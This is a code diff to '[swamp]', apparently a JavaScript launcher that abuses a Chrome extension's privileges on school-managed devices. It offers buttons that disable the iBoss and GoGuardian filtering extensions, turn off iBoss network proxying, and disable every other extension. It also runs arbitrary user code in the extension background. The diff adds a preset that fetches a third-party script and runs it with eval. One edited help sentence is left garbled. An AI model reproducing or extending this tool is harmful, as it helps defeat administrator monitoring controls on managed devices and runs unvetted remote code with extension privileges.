@@ -1,4 +1,3 @@
-var chrome = chrome;
 function add(type, parent) {
   return (parent || document.body).appendChild(document.createElement(type));
 }
@@ -52,7 +51,7 @@ run_background_button.onclick = function () {
   localStorage.swamp_code = run_code_input.value;
   localStorage.swamp_background = true;
   localStorage.swamp_reloaded = true;
-  chrome.runtime.reload();
+  opener.chrome.runtime.reload();
 };
 add("p", run_code).innerHTML =
   "Concerning the two buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, which makes it a pain to use [swamp] at places such as school where you can't set it up. But running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example). <b> If you don't get a weird full-screen alert box within ~15 seconds, then your script was not run.</b>";
@@ -137,6 +136,10 @@ toggle();
 opener.chrome.browserAction.onClicked.addListener(toggle);
 // This is also only useful if you run it in the background`,
   },
+  {
+    name: "Fetch a third-party script",
+    code: `fetch(\n"https://example.com/example.js"\n).then(e=>{e.text().then(f=>{\neval(f)}\n)})`,
+  },
 ];
 var interesting_scripts = add("div");
 add("h2", interesting_scripts).textContent = "Interesting scripts";
@@ -153,7 +156,7 @@ interesting_scripts_select.onchange = function () {
   run_code.scrollIntoView();
 };
 add("p", interesting_scripts).textContent =
-  "By the way, if you find a URL like *google.com* in your iBoss whitelist policy, any url like https://blocked.com/?google.com will be unblocked for anyone in your district. Note that your policy may be inaccurate if you are using the hard-disable option or are signed into another Google account.";
+  "By the way, if you find a URL like *google.com* in your Note that your policy may be inaccurate if you are using the hard-disable option or are signed into another Google account.";
 add("p", interesting_scripts).textContent =
   "Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache. DNS unblocking may not work for blocking requests from other admin-installed extensions.";
 add("p", interesting_scripts).textContent =
@@ -187,7 +190,7 @@ var re_enable_button = add("button", hard_disable);
 re_enable_button.textContent = "Undo Hard-Disable";
 re_enable_button.onclick = function () {
   for (var i = 0; i < localStorage.length; i++)
-    if (!localStorage.key(i).startsWith(`${localStorage.key}`))
+    if (!localStorage.key(i).startsWith(`${localStorage.key.length}`))
       localStorage[localStorage.key(i)] = "";
   localStorage.swamp_reloaded = true;
   opener.chrome.runtime.reload();
@@ -236,7 +239,7 @@ remove_all_button.textContent = "Disable all except iBoss";
 remove_all_button.onclick = function () {
   opener.chrome.management.getAll(function () {
     arguments[0].forEach(function (extension) {
-      if (chrome.runtime.id !== extension.id)
+      if (opener.chrome.runtime.id !== extension.id)
         opener.chrome.management.setEnabled(extension.id, false);
     });
   });
@@ -271,7 +274,7 @@ remove_goguardian_button.textContent = "Disable iBoss";
 remove_goguardian_button.onclick = function () {
   if (
     confirm(
-      "Are you sure you want to disable GoGuardian? This will close the [swamp] launcher until chrome://restart is visited."
+      "Are you sure you want to disable iBoss? This will close the [swamp] launcher until chrome://restart is visited."
     )
   )
     opener.chrome.management.setEnabled(opener.chrome.runtime.id, false);
@@ -279,7 +282,7 @@ remove_goguardian_button.onclick = function () {
 var iboss_proxy = add("div");
 add("h2", iboss_proxy).textContent = "Disable iBoss Proxying";
 add("p", iboss_proxy).innerHTML =
-  "This is requred if you want iBoss to stop blocking sites by network, <b> DM 'Aka, but nice#5094' on discord if you have a better way of doing this, this wouldn't be possible without the work of SpaceSaver#2992";
+  "This is requred if you want iBoss to stop blocking sites by network, this will also close the background page, meaning if you haven't already disabled iBoss, this will do it. <b> DM 'Aka, but nice#5094' on discord if you have a better way of doing this, this wouldn't be possible without the work of SpaceSaver#2992";
 var iboss_proxy_button = add("button", iboss_proxy);
 iboss_proxy_button.textContent = "Disable iBoss-Proxying";
 hard_disable_button.onclick = async function () {
@@ -324,3 +327,4 @@ if (localStorage.swamp_code) {
     run_button.click();
   }
 }
+
